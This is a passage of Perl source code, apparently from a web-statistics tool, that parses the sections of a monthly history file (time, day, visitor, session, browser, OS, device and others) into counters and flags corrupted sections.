						%_protocol_h = ();
						%_protocol_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}
			# BEGIN_ICONSTATUS
			if ( $field[0] eq 'BEGIN_ICONSTATUS' ) {
				if ($Debug) { debug(" Begin of ICONSTATUS section"); }
				$field[0] = '';
				my $count = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'iconstatus'} ) {
							my $type = $field[0];
							$_icon_status{$type}{'200'}   = int( $field[1] ) if $field[1];
							$_icon_status{$type}{'404'}   = int( $field[2] ) if $field[2];
							$_icon_status{$type}{'other'} = int( $field[3] ) if $field[3];
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field = split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				} until ( $field[0] eq 'END_ICONSTATUS' || $field[0] eq "${xmleb}END_ICONSTATUS" || !$_ );
				if ( $field[0] ne 'END_ICONSTATUS' && $field[0] ne "${xmleb}END_ICONSTATUS" ) {
					error( "History file corrupted (End of section ICONSTATUS not found)." );
				}
				delete $SectionsToLoad{'iconstatus'};
				if ( $SectionsToSave{'iconstatus'} ) {
					Save_History( 'iconstatus', $year, $month, $date );
					delete $SectionsToSave{'iconstatus'};
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}
			# BEGIN_CLUSTER
			if ( $field[0] eq 'BEGIN_CLUSTER' ) {
				if ($Debug) { debug(" Begin of CLUSTER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'cluster'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_cluster_p{ $field[0] } += int( $field[1] );
							}
							if ( $field[2] ) {
								$_cluster_h{ $field[0] } += int( $field[2] );
							}
							if ( $field[3] ) {
								$_cluster_k{ $field[0] } += int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_CLUSTER' || $field[0] eq "${xmleb}END_CLUSTER" || !$_ );
				if (   $field[0] ne 'END_CLUSTER'
					&& $field[0] ne "${xmleb}END_CLUSTER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section CLUSTER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of CLUSTER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'cluster'};
				if ( $SectionsToSave{'cluster'} ) {
					Save_History( 'cluster', $year, $month, $date );
					delete $SectionsToSave{'cluster'};
					if ($withpurge) {
						%_cluster_p = ();
						%_cluster_h = ();
						%_cluster_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_TIME
			if ( $field[0] eq 'BEGIN_TIME' ) {
				my $monthpages          = 0;
				my $monthhits           = 0;
				my $monthbytes          = 0;
				my $monthnotviewedpages = 0;
				my $monthnotviewedhits  = 0;
				my $monthnotviewedbytes = 0;
				if ($Debug) { debug(" Begin of TIME section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {

					if ( $field[0] ne '' )
					{    # Test on ne '' because field[0] is '0' for hour 0)
						$count++;
						if ( $SectionsToLoad{'time'} ) {
							if (   $withupdate
								|| $MonthRequired eq 'all'
								|| $MonthRequired eq "$month" )
							{    # Still required
								$countloaded++;
								if ( $field[1] ) {
									$_time_p[ $field[0] ] += int( $field[1] );
								}
								if ( $field[2] ) {
									$_time_h[ $field[0] ] += int( $field[2] );
								}
								if ( $field[3] ) {
									$_time_k[ $field[0] ] += int( $field[3] );
								}
								if ( $field[4] ) {
									$_time_nv_p[ $field[0] ] +=
									  int( $field[4] );
								}
								if ( $field[5] ) {
									$_time_nv_h[ $field[0] ] +=
									  int( $field[5] );
								}
								if ( $field[6] ) {
									$_time_nv_k[ $field[0] ] +=
									  int( $field[6] );
								}
							}
							$monthpages          += int( $field[1] );
							$monthhits           += int( $field[2] );
							$monthbytes          += int( $field[3] );
							$monthnotviewedpages += int( $field[4] || 0 );
							$monthnotviewedhits  += int( $field[5] || 0 );
							$monthnotviewedbytes += int( $field[6] || 0 );
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_TIME' || $field[0] eq "${xmleb}END_TIME" || !$_ );
				if (   $field[0] ne 'END_TIME'
					&& $field[0] ne "${xmleb}END_TIME" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section TIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of TIME section ($count entries, $countloaded loaded)"
					);
				}
				$MonthPages{ $year . $month }          += $monthpages;
				$MonthHits{ $year . $month }           += $monthhits;
				$MonthBytes{ $year . $month }          += $monthbytes;
				$MonthNotViewedPages{ $year . $month } += $monthnotviewedpages;
				$MonthNotViewedHits{ $year . $month }  += $monthnotviewedhits;
				$MonthNotViewedBytes{ $year . $month } += $monthnotviewedbytes;
				delete $SectionsToLoad{'time'};

				if ( $SectionsToSave{'time'} ) {
					Save_History( 'time', $year, $month, $date );
					delete $SectionsToSave{'time'};
					if ($withpurge) {
						@_time_p    = ();
						@_time_h    = ();
						@_time_k    = ();
						@_time_nv_p = ();
						@_time_nv_h = ();
						@_time_nv_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_ORIGIN
			if ( $field[0] eq 'BEGIN_ORIGIN' ) {
				if ($Debug) { debug(" Begin of ORIGIN section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'origin'} ) {
							if ( $field[0] eq 'From0' ) {
								$_from_p[0] += $field[1];
								$_from_h[0] += $field[2];
							}
							elsif ( $field[0] eq 'From1' ) {
								$_from_p[1] += $field[1];
								$_from_h[1] += $field[2];
							}
							elsif ( $field[0] eq 'From2' ) {
								$_from_p[2] += $field[1];
								$_from_h[2] += $field[2];
							}
							elsif ( $field[0] eq 'From3' ) {
								$_from_p[3] += $field[1];
								$_from_h[3] += $field[2];
							}
							elsif ( $field[0] eq 'From4' ) {
								$_from_p[4] += $field[1];
								$_from_h[4] += $field[2];
							}
							elsif ( $field[0] eq 'From5' ) {
								$_from_p[5] += $field[1];
								$_from_h[5] += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_ORIGIN' || $field[0] eq "${xmleb}END_ORIGIN" || !$_ );
				if (   $field[0] ne 'END_ORIGIN'
					&& $field[0] ne "${xmleb}END_ORIGIN" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section ORIGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of ORIGIN section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'origin'};
				if ( $SectionsToSave{'origin'} ) {
					Save_History( 'origin', $year, $month, $date );
					delete $SectionsToSave{'origin'};
					if ($withpurge) { @_from_p = (); @_from_h = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_DAY
			if ( $field[0] eq 'BEGIN_DAY' ) {
				if ($Debug) { debug(" Begin of DAY section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'day'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$DayPages{ $field[0] } += int( $field[1] );
							}
							$DayHits{ $field[0] } +=
							  int( $field[2] )
							  ; # DayHits always load (should be >0 and if not it's a day YYYYMM00 resulting of an old file migration)
							if ( $field[3] ) {
								$DayBytes{ $field[0] } += int( $field[3] );
							}
							if ( $field[4] ) {
								$DayVisits{ $field[0] } += int( $field[4] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_DAY' || $field[0] eq "${xmleb}END_DAY" || !$_ );
				if ( $field[0] ne 'END_DAY' && $field[0] ne "${xmleb}END_DAY" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section DAY not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of DAY section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'day'};

				# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
				#if ($SectionsToSave{'day'}) {	# Must be made after read of visitor
				#	Save_History('day',$year,$month,$date); delete $SectionsToSave{'day'};
				#	if ($withpurge) { %DayPages=(); %DayHits=(); %DayBytes=(); %DayVisits=(); }
				#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_VISITOR
			if ( $field[0] eq 'BEGIN_VISITOR' ) {
				if ($Debug) { debug(" Begin of VISITOR section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;

						# For backward compatibility
						if ($readvisitorforbackward) {
							if ( $field[1] ) {
								$MonthUnique{ $year . $month }++;
							}
							if ( $MonthRequired ne 'all' ) {
								if (   $field[0] !~ /^\d+\.\d+\.\d+\.\d+$/
									&& $field[0] !~ /^[0-9A-F]*:/i )
								{
									$MonthHostsKnown{ $year . $month }++;
								}
								else { $MonthHostsUnknown{ $year . $month }++; }
							}
						}

						# Process data saved in 'wait' arrays
						if ( $withupdate && $_waithost_e{ $field[0] } ) {
							my $timehostl = int( $field[4] || 0 );
							my $timehosts = int( $field[5] || 0 );
							my $newtimehosts = (
								  $_waithost_s{ $field[0] }
								? $_waithost_s{ $field[0] }
								: $_host_s{ $field[0] }
							);
							my $newtimehostl = (
								  $_waithost_l{ $field[0] }
								? $_waithost_l{ $field[0] }
								: $_host_l{ $field[0] }
							);
							if ( $newtimehosts > $timehostl + $VISITTIMEOUT ) {
								if ($Debug) {
									debug( " Visit for $field[0] in 'wait' arrays is a new visit different than last in history",
										4
									);
								}
								if ( $field[6] ) { $_url_x{ $field[6] }++; }
								$_url_e{ $_waithost_e{ $field[0] } }++;
								$newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
								$DayVisits{$1}++;
								if ( $timehosts && $timehostl ) {
									my $session_range = GetSessionRange($timehosts, $timehostl, $field[6]);
									if (defined $session_range) {
										$_session{$session_range}++;
									}
								}
								if ( $_waithost_s{ $field[0] } ) {
	   								# First session found in log was followed by another one so it's finished
									my $session_url = $_waithost_u{ $field[0] } || '';
									my $session_range = GetSessionRange($newtimehosts, $newtimehostl, $session_url);
									if (defined $session_range) {
										$_session{$session_range}++;
									}
								}
					 		# Here $_host_l $_host_s and $_host_u are correctly defined
							}
							else {
								if ($Debug) {
									debug( " Visit for $field[0] in 'wait' arrays is following of last visit in history",
										4
									);
								}
								if ( $_waithost_s{ $field[0] } ) {
	   								# First session found in log was followed by another one so it's finished
									my $session_url = $_waithost_u{ $field[0] } || '';
									my $session_range = GetSessionRange(
										MinimumButNoZero( $timehosts, $newtimehosts ),
										$timehostl > $newtimehostl ? $timehostl : $newtimehostl,
										$session_url
									);
									if (defined $session_range) {
										$_session{$session_range}++;
									}
					 			# Here $_host_l $_host_s and $_host_u are correctly defined
								}
								else {
									# We correct $_host_l $_host_s and $_host_u
									if ( $timehostl > $newtimehostl ) {
										$_host_l{ $field[0] } = $timehostl;
										$_host_u{ $field[0] } = $field[6];
									}
									if ( $timehosts < $newtimehosts ) {
										$_host_s{ $field[0] } = $timehosts;
									}
								}
							}
							delete $_waithost_e{ $field[0] };
							delete $_waithost_l{ $field[0] };
							delete $_waithost_s{ $field[0] };
							delete $_waithost_u{ $field[0] };
						}

						# Load records
						if (   $readvisitorforbackward != 2
							&& $SectionsToLoad{'visitor'} )
						{    # if readvisitorforbackward==2 we do not load
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if (   $HTMLOutput{'allhosts'}
									|| $HTMLOutput{'lasthosts'} )
								{
									if (
										(
											!$FilterIn{'host'}
											|| $field[0] =~ /$FilterIn{'host'}/i
										)
										&& ( !$FilterEx{'host'}
											|| $field[0] !~
											/$FilterEx{'host'}/i )
									  )
									{
										$loadrecord = 1;
									}
								}
								elsif ($MonthRequired eq 'all'
									|| $field[2] >= $MinHit{'Host'} )
								{
									if (
										$HTMLOutput{'unknownip'}
										&& ( $field[0] =~ /^\d+\.\d+\.\d+\.\d+$/
											|| $field[0] =~ /^[0-9A-F]*:/i )
									  )
									{
										$loadrecord = 1;
									}
									elsif (
										$HTMLOutput{'main'}
										&& (   $MonthRequired eq 'all'
											|| $countloaded <
											$MaxNbOf{'HostsShown'} )
									  )
									{
										$loadrecord = 1;
									}
								}
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									$_host_p{ $field[0] } += $field[1];
								}
								if ( $field[2] ) {
									$_host_h{ $field[0] } += $field[2];
								}
								if ( $field[3] ) {
									$_host_k{ $field[0] } += $field[3];
								}
								if ( $field[4] && !$_host_l{ $field[0] } )
								{ # We save last connexion params if not previously defined
									$_host_l{ $field[0] } = int( $field[4] );
									if ($withupdate)
									{ # field[5] field[6] are used only for update
										if ( $field[5]
											&& !$_host_s{ $field[0] } )
										{
											$_host_s{ $field[0] } =
											  int( $field[5] );
										}
										if ( $field[6]
											&& !$_host_u{ $field[0] } )
										{
											$_host_u{ $field[0] } = $field[6];
										}
									}
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_VISITOR' || $field[0] eq "${xmleb}END_VISITOR" || !$_ );
				if (   $field[0] ne 'END_VISITOR'
					&& $field[0] ne "${xmleb}END_VISITOR" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section VISITOR not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of VISITOR section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'visitor'};

				# WE DO NOT SAVE SECTION NOW TO BE SURE TO HAVE THIS LARGE SECTION NOT AT THE BEGINNING OF FILE
				#if ($SectionsToSave{'visitor'}) {
				#	Save_History('visitor',$year,$month,$date); delete $SectionsToSave{'visitor'};
				#	if ($withpurge) { %_host_p=(); %_host_h=(); %_host_k=(); %_host_l=(); %_host_s=(); %_host_u=(); }
				#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_UNKNOWNIP for backward compatibility
			if ( $field[0] eq 'BEGIN_UNKNOWNIP' ) {
				my %iptomigrate = ();
				if ($Debug) { debug(" Begin of UNKNOWNIP section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'unknownip'} ) {
							$iptomigrate{ $field[0] } = $field[1] || 0;
							$countloaded++;
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				} until ( $field[0] eq 'END_UNKNOWNIP' || $field[0] eq "${xmleb}END_UNKNOWNIP" || !$_ );
				if (   $field[0] ne 'END_UNKNOWNIP'
					&& $field[0] ne "${xmleb}END_UNKNOWNIP" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section UNKOWNIP not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of UNKOWNIP section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'visitor'};

				# THIS SECTION IS NEVER SAVED. ONLY READ FOR MIGRATE AND CONVERTED INTO VISITOR SECTION
				foreach ( keys %iptomigrate ) {
					$_host_p{$_} += int( $_host_p{'Unknown'} / $countloaded );
					$_host_h{$_} += int( $_host_h{'Unknown'} / $countloaded );
					$_host_k{$_} += int( $_host_k{'Unknown'} / $countloaded );
					if ( $iptomigrate{$_} > 0 ) {
						$_host_l{$_} = $iptomigrate{$_};
					}
				}
				delete $_host_p{'Unknown'};
				delete $_host_h{'Unknown'};
				delete $_host_k{'Unknown'};
				delete $_host_l{'Unknown'};
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_LOGIN
			if ( $field[0] eq 'BEGIN_LOGIN' ) {
				if ($Debug) { debug(" Begin of LOGIN section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'login'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_login_p{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_login_h{ $field[0] } += $field[2];
							}
							if ( $field[3] ) {
								$_login_k{ $field[0] } += $field[3];
							}
							if ( !$_login_l{ $field[0] } && $field[4] ) {
								$_login_l{ $field[0] } = int( $field[4] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				} until ( $field[0] eq 'END_LOGIN' || $field[0] eq "${xmleb}END_LOGIN" || !$_ );
				if (   $field[0] ne 'END_LOGIN'
					&& $field[0] ne "${xmleb}END_LOGIN" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section LOGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of LOGIN section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'login'};
				if ( $SectionsToSave{'login'} ) {
					Save_History( 'login', $year, $month, $date );
					delete $SectionsToSave{'login'};
					if ($withpurge) {
						%_login_p = ();
						%_login_h = ();
						%_login_k = ();
						%_login_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_DOMAIN
			if ( $field[0] eq 'BEGIN_DOMAIN' ) {
				if ($Debug) { debug(" Begin of DOMAIN section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'domain'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_domener_p{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_domener_h{ $field[0] } += $field[2];
							}
							if ( $field[3] ) {
								$_domener_k{ $field[0] } += $field[3];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_DOMAIN' || $field[0] eq "${xmleb}END_DOMAIN" || !$_ );
				if (   $field[0] ne 'END_DOMAIN'
					&& $field[0] ne "${xmleb}END_DOMAIN" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section DOMAIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of DOMAIN section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'domain'};
				if ( $SectionsToSave{'domain'} ) {
					Save_History( 'domain', $year, $month, $date );
					delete $SectionsToSave{'domain'};
					if ($withpurge) {
						%_domener_p = ();
						%_domener_h = ();
						%_domener_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SESSION
			if ( $field[0] eq 'BEGIN_SESSION' ) {
				if ($Debug) { debug(" Begin of SESSION section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'session'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_session{ $field[0] } += $field[1];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				} until ( $field[0] eq 'END_SESSION' || $field[0] eq "${xmleb}END_SESSION" || !$_ );
				if (   $field[0] ne 'END_SESSION'
					&& $field[0] ne "${xmleb}END_SESSION" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section SESSION not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of SESSION section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'session'};

				# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
				#if ($SectionsToSave{'session'}) {
				#	Save_History('session',$year,$month,$date); delete $SectionsToSave{'session'}; }
				#	if ($withpurge) { %_session=(); }
				#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_OS
			if ( $field[0] eq 'BEGIN_OS' ) {
				if ($Debug) { debug(" Begin of OS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'os'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_os_h{ $field[0] } += $field[1];
								$_os_p{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_OS' || $field[0] eq "${xmleb}END_OS" || !$_ );
				if ( $field[0] ne 'END_OS' && $field[0] ne "${xmleb}END_OS" ) {
					error( "History file \"$filetoread\" is corrupted (End of section OS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of OS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'os'};
				if ( $SectionsToSave{'os'} ) {
					Save_History( 'os', $year, $month, $date );
					delete $SectionsToSave{'os'};
					if ($withpurge) { %_os_h = (); %_os_p = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_BROWSER
			if ( $field[0] eq 'BEGIN_BROWSER' ) {
				if ($Debug) { debug(" Begin of BROWSER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'browser'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_browser_h{ $field[0] } += $field[1];
								$_browser_p{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_BROWSER' || $field[0] eq "${xmleb}END_BROWSER" || !$_ );
				if (   $field[0] ne 'END_BROWSER'
					&& $field[0] ne "${xmleb}END_BROWSER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section BROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of BROWSER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'browser'};
				if ( $SectionsToSave{'browser'} ) {
					Save_History( 'browser', $year, $month, $date );
					delete $SectionsToSave{'browser'};
					if ($withpurge) { %_browser_h = (); %_browser_p = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_UNKNOWNREFERER
			if ( $field[0] eq 'BEGIN_UNKNOWNREFERER' ) {
				if ($Debug) { debug(" Begin of UNKNOWNREFERER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'unknownreferer'} ) {
							$countloaded++;
							if ( !$_unknownreferer_l{ $field[0] } ) {
								$_unknownreferer_l{ $field[0] } =
								  int( $field[1] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_UNKNOWNREFERER' || $field[0] eq "${xmleb}END_UNKNOWNREFERER" || !$_ );
				if (   $field[0] ne 'END_UNKNOWNREFERER'
					&& $field[0] ne "${xmleb}END_UNKNOWNREFERER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of UNKNOWNREFERER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'unknownreferer'};
				if ( $SectionsToSave{'unknownreferer'} ) {
					Save_History( 'unknownreferer', $year, $month, $date );
					delete $SectionsToSave{'unknownreferer'};
					if ($withpurge) { %_unknownreferer_l = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_UNKNOWNREFERERBROWSER
			if ( $field[0] eq 'BEGIN_UNKNOWNREFERERBROWSER' ) {
				if ($Debug) {
					debug(" Begin of UNKNOWNREFERERBROWSER section");
				}
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'unknownrefererbrowser'} ) {
							$countloaded++;
							if ( !$_unknownrefererbrowser_l{ $field[0] } ) {
								$_unknownrefererbrowser_l{ $field[0] } =
								  int( $field[1] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_UNKNOWNREFERERBROWSER' || $field[0] eq "${xmleb}END_UNKNOWNREFERERBROWSER" || !$_ );
				if (   $field[0] ne 'END_UNKNOWNREFERERBROWSER'
					&& $field[0] ne "${xmleb}END_UNKNOWNREFERERBROWSER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERERBROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'unknownrefererbrowser'};
				if ( $SectionsToSave{'unknownrefererbrowser'} ) {
					Save_History( 'unknownrefererbrowser',
						$year, $month, $date );
					delete $SectionsToSave{'unknownrefererbrowser'};
					if ($withpurge) { %_unknownrefererbrowser_l = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}
			# BEGIN_DEVICE
			if ( $field[0] eq 'BEGIN_DEVICE' ) {
				if ($Debug) { debug(" Begin of DEVICE section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'device'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_device_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_device_p{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field = split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				} until ( $field[0] eq 'END_DEVICE' || $field[0] eq "${xmleb}END_DEVICE" || !$_ );
				if ( $field[0] ne 'END_DEVICE' && $field[0] ne "${xmleb}END_DEVICE" ) {
					error( "History file corrupted (End of section DEVICE not found)." );
				}
				if ($Debug) {
					debug( " End of DEVICE section ($count entries, $countloaded loaded)" );
				}
				delete $SectionsToLoad{'device'};
